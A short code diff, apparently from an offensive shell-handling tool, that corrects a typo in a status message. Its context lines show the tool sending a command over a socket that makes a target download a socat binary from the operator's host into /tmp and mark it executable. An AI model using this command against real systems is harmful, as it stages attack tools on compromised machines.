@@ -35,7 +35,7 @@ class sarsh:
         sleep(3)
         client_socket.send(f"wget http://{self.lhost}:{new_port}/socat -O /tmp/{new_filename} && chmod +x /tmp/{new_filename}\n".encode())
         sleep(3)
-        print("\nSocal transfered!")
+        print("\nSocat transfered!")
         print(f"Socat name on the target: /tmp/{new_filename}")
         self.stop_http_server()
         return new_filename
